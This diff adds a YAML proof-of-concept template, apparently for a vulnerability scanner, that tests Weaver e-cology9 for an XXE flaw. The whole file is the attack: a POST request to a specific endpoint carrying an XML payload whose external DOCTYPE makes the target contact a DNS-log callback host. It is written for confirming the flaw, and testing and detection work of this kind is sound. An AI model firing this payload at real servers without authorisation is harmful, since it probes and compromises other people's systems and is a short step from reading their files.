@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-cology9-xxe
+info:
+  name: 泛微e-cology9 XXE漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - xxe
+  finger: e-cology
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /rest/ofs/ReceiveCCRequestByXml
+  headers:
+    Content-Type: application/xml
+  data: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE syscode SYSTEM "http://{{.reverseDomain}}"><M><syscode>&send;</syscode></M>
+  expression: status_code == 200 && reverse.Verify()
+transport: http
